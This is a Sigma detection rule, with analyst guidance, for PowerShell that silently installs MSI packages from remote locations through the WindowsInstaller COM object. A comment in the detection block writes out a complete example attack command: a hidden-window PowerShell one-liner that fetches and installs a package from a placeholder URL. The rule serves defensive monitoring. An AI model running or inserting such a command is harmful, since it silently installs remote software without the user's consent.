title: PowerShell MSI Install via WindowsInstaller COM From Remote Location
id: 222720a7-047f-4054-baa5-bab9be757db0
status: experimental
description: |
  Detects the execution of PowerShell commands that attempt to install MSI packages via the
  Windows Installer COM object (`WindowsInstaller.Installer`) hosted remotely.
  This could be indication of malicious software deployment or lateral movement attempts using Windows Installer functionality.
  And the usage of WindowsInstaller COM object rather than msiexec could be an attempt to bypass the detection.
references:
- https://informationsecuritybuzz.com/the-real-danger-behind-a-simple-windows-shortcut/
- https://redcanary.com/blog/threat-intelligence/intelligence-insights-may-2025/
- https://www.virustotal.com/gui/file/f9710b0ba4de5fa0e7ec27da462d4d2fc6838eba83a19f23f6617a466bbad457
author: Meroujan Antonyan (vx3r)
date: 2025-06-05
tags:
- attack.execution
- attack.t1059.001
- attack.defense-evasion
- attack.t1218
- attack.command-and-control
- attack.t1105
logsource:
  category: process_creation
  product: windows
detection:
    # Example: "C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -W Hidden -C "$u='https://example.com/';$i=New-Object -ComObject('WindowsInstaller.Installer');$i.UILevel=2;$i.InstallProduct($u),'')";
  selection_img:
  - Image|endswith:
    - '\powershell_ise.exe'
    - '\powershell.exe'
    - '\pwsh.exe'
  - OriginalFileName:
    - 'PowerShell_ISE.EXE'
    - 'PowerShell.EXE'
    - 'pwsh.dll'
  selection_cli:
    CommandLine|contains|all:
    - '-ComObject'
    - 'InstallProduct('
  selection_remote:
    CommandLine|contains:
    - 'http'
    - '\\\\'
  filter_main_localhost:
    CommandLine|contains:
    - '://127.0.0.1'
    - '://localhost'
  condition: all of selection_* and not 1 of filter_main_*
falsepositives:
- Unknown
level: medium
note: |
  ### Technical Context

  This rule detects the execution of PowerShell commands used to install MSI packages via the Windows Installer COM object from a remote location. The potential attacker objective is likely to deploy unauthorized software or conduct lateral movement within the network, leveraging the capabilities of the Windows Installer to avoid detection by traditional methods. This behavior is associated with the MITRE ATT&CK technique for Execution: Command and Scripting Interpreter for PowerShell (T1059.001) and Defense Evasion (T1218).

  The primary telemetry sources necessary for this detection include process creation logs, particularly focusing on PowerShell executables (Event ID 4688) or related Sysmon logs. If malicious, this behavior could introduce unwanted software or facilitate further compromise of the system. Importantly, this detection does NOT confirm that malicious activity has occurred on its own; additional context and investigation are necessary to assess intent.

  ### Investigation Steps

  - **Review process creation logs:** Check for Security Event ID 4688 for PowerShell executable instances (`powershell.exe`, `powershell_ise.exe`, `pwsh.exe`) where the CommandLine contains '-ComObject' and 'InstallProduct('. Identify any associated parent processes, particularly relating to administrative or automation scripts.

  - **Examine command line arguments:** Look for specific patterns in the command line of the PowerShell instance that contain remote URLs (e.g., 'http', '\\\\') indicating installation from an external source. Confirm if the source URL is known or authorized within the environment.

  - **Determine expected behavior:** Ensure that legitimate administrative or deployment activities are recorded around the timeframe of the alert. Typical activities may include organizational patch management or software deployment tasks initiated by IT staff, typically logged with specific Service or User accounts.

  - **Identify malicious indicators:** Focus on commands involving the 'InstallProduct' parameter, especially those with unusual or non-standard URLs. Specific patterns of these URLs can indicate bypass attempts from known threat actors.

  - **Correlate with network logs:** Investigate outbound network connections corresponding to the detected process. Review firewall or proxy logs for connections to remote locations at the time of the alert, checking for any suspicious or anomalous traffic related to known vulnerabilities.

  ### Prioritization

  This alert is of medium severity as it targets systems capable of software installation and potentially allows for rapid propagation of malicious software. The likelihood of abuse is moderate, particularly in environments where administrative tasks are frequently automated. This behavior, specifically using the Windows Installer COM object, may not be commonly weaponized but indicates advanced evasion techniques employed by adversaries.

  ### Blind Spots and Assumptions

  Detection of this behavior may be evaded by legitimate administrative operations that use similar PowerShell commands for remote installations. The accuracy of detection relies on having comprehensive logging configured for PowerShell executions and process creations. Legitimate software installations executed by IT automation scripts could trigger this alert if not properly contextualized. A companion detection to consider is monitoring for network connections initiated from newly executed processes (e.g., correlating with other suspicious process creations or unusual outbound connections).

